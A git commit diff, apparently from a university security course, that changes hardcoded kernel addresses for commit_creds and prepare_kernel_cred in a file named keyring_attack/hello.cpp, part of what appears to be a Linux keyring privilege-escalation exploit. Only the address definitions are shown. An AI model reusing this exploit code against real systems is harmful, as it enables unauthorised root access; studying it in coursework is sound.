fb86fea03da47d7236923857b9cc3c1899dd13e3
Ian Pudney <ian.pudney.git@gmail.com>
2016-04-07 14:20:03 -0400

    changing addresses to 280 addresses

--- 280/keyring_attack/hello.cpp
+++ 280/keyring_attack/hello.cpp
@@ -38,13 +38,10 @@ _commit_creds commit_creds;
 _prepare_kernel_cred prepare_kernel_cred;
 
 #define STRUCT_LEN (0xb8 - 0x30)
-/* Ubuntu addresses
+
 #define COMMIT_CREDS_ADDR (0xffffffff81095710)
 #define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81095a10)
-*/
-/* autograder ones: */
-#define COMMIT_CREDS_ADDR (0xffffffff81095710)
-#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff8109e1f0)
+
 
 struct key_type {
 	char * name;
